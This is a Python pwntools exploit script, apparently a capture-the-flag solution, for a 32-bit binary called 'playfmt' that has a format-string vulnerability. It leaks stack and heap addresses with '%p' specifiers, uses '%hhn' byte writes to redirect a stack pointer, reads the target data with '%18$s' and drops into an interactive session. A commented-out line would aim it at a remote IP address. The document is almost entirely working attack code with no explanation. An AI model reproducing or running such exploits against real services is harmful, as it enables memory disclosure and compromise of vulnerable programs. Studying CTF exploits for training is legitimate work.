#!/usr/bin/python2
# -*- coding:utf-8 -*-

from pwn import *
import os
import struct
import random
import time
import sys
import signal

salt = os.getenv('GDB_SALT') if (os.getenv('GDB_SALT')) else ''

def clear(signum=None, stack=None):
    print('Strip  all debugging information')
    os.system('rm -f /tmp/gdb_symbols{}* /tmp/gdb_pid{}* /tmp/gdb_script{}*'.replace('{}', salt))
    exit(0)

for sig in [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]: 
    signal.signal(sig, clear)

# # Create a symbol file for GDB debugging
# try:
#     gdb_symbols = '''

#     '''

#     f = open('/tmp/gdb_symbols{}.c'.replace('{}', salt), 'w')
#     f.write(gdb_symbols)
#     f.close()
#     os.system('gcc -g -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
#     # os.system('gcc -g -m32 -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
# except Exception as e:
#     print(e)

# context.arch = 'amd64'
context.arch = 'i386'
# context.log_level = 'debug'
execve_file = './playfmt'
# sh = process(execve_file, env={'LD_PRELOAD': '/tmp/gdb_symbols{}.so'.replace('{}', salt)})
sh = process(execve_file, env={'LD_LIBRARY_PATH': '/usr/lib32/'})
# sh = remote('120.78.192.35', 9999)
elf = ELF(execve_file)
# libc = ELF('./libc-2.27.so')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Create temporary files for GDB debugging
try:
    gdbscript = '''
    b *0x0804889F
    '''

    f = open('/tmp/gdb_pid{}'.replace('{}', salt), 'w')
    f.write(str(proc.pidof(sh)[0]))
    f.close()

    f = open('/tmp/gdb_script{}'.replace('{}', salt), 'w')
    f.write(gdbscript)
    f.close()
except Exception as e:
    print(e)

sh.recvuntil('=====================\n')
sh.recvuntil('=====================\n')
# pause()
sh.send('%6$p\n\0')
stack_addr = int(sh.recvline(), 16)
log.success('stack_addr: ' + hex(stack_addr))

sh.send('%18$p\n\0')
heap_addr = int(sh.recvline(), 16) - 0xa28
log.success('heap_addr: ' + hex(heap_addr))

sh.send('%6$p\n\0')
stack2_addr = u32(sh.recvline()[:4])
if((stack2_addr & 0xff00) != (stack_addr & 0xff00)):
    raise Exception("stack")

one_byte = (stack_addr & 0xff) + 0x10
payload = '%' + str(one_byte) + 'c%6$hhn\n\0'

# pause()
sh.send(payload)
sh.recvline()

# pause()
payload = '%' + str(0x10) + 'c%14$hhn\n\0'
sh.send(payload)
sh.recvline()

sh.send('%18$s\n\0')

sh.interactive()
clear()